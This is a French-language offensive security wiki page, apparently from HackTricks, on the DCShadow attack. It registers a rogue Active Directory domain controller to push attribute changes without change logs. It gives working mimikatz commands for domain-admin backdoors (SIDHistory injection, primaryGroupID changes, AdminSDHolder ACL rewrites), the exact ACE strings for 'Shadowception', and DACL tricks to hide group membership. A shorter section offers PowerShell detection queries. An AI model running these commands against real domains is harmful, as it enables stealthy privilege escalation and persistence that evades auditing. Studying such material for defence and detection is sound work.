# DCShadow

{{#include ../../banners/hacktricks-training.md}}


## Informations de base

Il enregistre un **nouveau Contrôleur de domaine** dans l’AD et l’utilise pour **pousser des attributs** (SIDHistory, SPNs...) sur des objets spécifiés **sans laisser de logs** concernant les **modifications**. Vous **devez disposer des privilèges DA** et vous trouver dans le **domaine racine**.\
Notez que si vous utilisez des données incorrectes, des logs assez désagréables apparaîtront.<sup>[[2]](#references)</sup>

Pour effectuer l’attaque, vous avez besoin de 2 instances de mimikatz. L’une d’elles démarrera les serveurs RPC avec les privilèges SYSTEM (vous devez y indiquer les modifications que vous souhaitez effectuer), et l’autre instance sera utilisée pour pousser les valeurs :
```bash:mimikatz1 (RPC servers)
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```

```bash:mimikatz2 (push) - Needs DA or similar
lsadump::dcshadow /push
```
Notez que **`elevate::token`** ne fonctionnera pas dans la session `mimikatz1`, car cela élève les privilèges du thread, alors que nous devons élever le **privilège du processus**.\
Vous pouvez également sélectionner un objet « LDAP » : `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

Vous pouvez appliquer les modifications depuis un DA ou depuis un utilisateur disposant de ces permissions minimales :

- Dans l’**objet du domaine** :
- _DS-Install-Replica_ (Ajouter/Supprimer un Replica dans le domaine)
- _DS-Replication-Manage-Topology_ (Gérer la topologie de réplication)
- _DS-Replication-Synchronize_ (Synchronisation de la réplication)
- L’objet **Sites** (et ses enfants) dans le **conteneur Configuration** :
- _CreateChild et DeleteChild_
- L’objet de l’**ordinateur enregistré comme DC** :
- _WriteProperty_ (et non Write)
- L’**objet cible** :
- _WriteProperty_ (et non Write)

Vous pouvez utiliser [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) pour accorder ces privilèges à un utilisateur non privilégié (notez que cela laissera certains logs). C’est beaucoup plus restrictif que de disposer de privilèges DA.\
Par exemple : `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` Cela signifie que le nom d’utilisateur _**student1**_, lorsqu’il est connecté sur la machine _**mcorp-student1**_, dispose des permissions DCShadow sur l’objet _**root1user**_.

## Utiliser DCShadow pour créer des backdoors
```bash:Set Enterprise Admins in SIDHistory to a user
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```

```bash:Chage PrimaryGroupID (put user as member of Domain Administrators)
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```

```bash:Modify ntSecurityDescriptor of AdminSDHolder (give Full Control to a user)
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
### Abus du primary group, lacunes d’énumération et détection

- `primaryGroupID` est un attribut distinct de la liste `member` du groupe. DCShadow/DSInternals peuvent l’écrire directement (par exemple, définir `primaryGroupID=512` pour **Domain Admins**) sans enforcement LSASS local, mais AD **déplace** tout de même l’utilisateur : modifier le PGID supprime toujours son appartenance à l’ancien primary group (même comportement pour tout groupe cible), vous ne pouvez donc pas conserver l’ancienne appartenance au primary group.<sup>[[1]](#references)</sup>
- Les outils par défaut empêchent de supprimer un utilisateur de son primary group actuel (`ADUC`, `Remove-ADGroupMember`) ; modifier le PGID nécessite donc généralement des écritures directes dans l’annuaire (DCShadow/`Set-ADDBPrimaryGroup`).
- Le reporting des appartenances est incohérent :
- **Inclut** les membres dérivés du primary group : `Get-ADGroupMember "Domain Admins"`, `net group "Domain Admins"`, ADUC/Admin Center.
- **Omet** les membres dérivés du primary group : `Get-ADGroup "Domain Admins" -Properties member`, ADSI Edit en inspectant `member`, `Get-ADUser <user> -Properties memberOf`.
- Les vérifications récursives peuvent ne pas détecter les membres du primary group si le **primary group** est lui-même imbriqué (par exemple, si le PGID de l’utilisateur pointe vers un groupe imbriqué dans Domain Admins) ; `Get-ADGroupMember -Recursive` ou les filtres récursifs LDAP ne retourneront pas cet utilisateur, sauf si la récursion résout explicitement les primary groups.
- Astuces DACL : les attaquants peuvent **refuser ReadProperty** sur `primaryGroupID` au niveau de l’utilisateur (ou sur l’attribut `member` du groupe pour les groupes qui ne sont pas protégés par AdminSDHolder), masquant ainsi l’appartenance effective à la plupart des requêtes PowerShell ; `net group` continuera toutefois à résoudre l’appartenance. Les groupes protégés par AdminSDHolder réinitialiseront ces refus.

Exemples de détection/monitoring :
```powershell
# Find users whose primary group is not the default Domain Users (RID 513)
Get-ADUser -Filter * -Properties primaryGroup,primaryGroupID |
Where-Object { $_.primaryGroupID -ne 513 } |
Select-Object Name,SamAccountName,primaryGroupID,primaryGroup
```

```powershell
# Find users where primaryGroupID cannot be read (likely denied via DACL)
Get-ADUser -Filter * -Properties primaryGroupID |
Where-Object { -not $_.primaryGroupID } |
Select-Object Name,SamAccountName
```
Vérifiez les groupes privilégiés en comparant la sortie de `Get-ADGroupMember` avec `Get-ADGroup -Properties member` ou ADSI Edit afin de détecter les divergences introduites par `primaryGroupID` ou des attributs masqués.<sup>[[1]](#references)</sup>

## Shadowception - Accorder les permissions DCShadow à l'aide de DCShadow (aucun journal de permissions modifiées)

Nous devons ajouter les ACE suivants avec le SID de notre utilisateur à la fin :<sup>[[2]](#references)</sup>

- Sur l'objet du domaine :
- `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
- `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- Sur l'objet de l'ordinateur de l'attaquant : `(A;;WP;;;UserSID)`
- Sur l'objet de l'utilisateur cible : `(A;;WP;;;UserSID)`
- Sur l'objet Sites dans le conteneur Configuration : `(A;CI;CCDC;;;UserSID)`

Pour obtenir l'ACE actuelle d'un objet : `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`

Notez que dans ce cas, vous devez effectuer **plusieurs modifications**, et non une seule. Ainsi, dans la **session mimikatz1** (serveur RPC), utilisez le paramètre **`/stack` pour chaque modification** que vous souhaitez effectuer. De cette manière, vous n'aurez besoin d'utiliser **`/push`** qu'une seule fois pour appliquer toutes les modifications empilées sur le serveur rogue.

[**Plus d'informations sur DCShadow sur ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)

## Références

- [1] [TrustedSec - Adventures in Primary Group Behavior, Reporting, and Exploitation](https://trustedsec.com/blog/adventures-in-primary-group-behavior-reporting-and-exploitation)
- [2] [DCShadow write-up in ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)

{{#include ../../banners/hacktricks-training.md}}
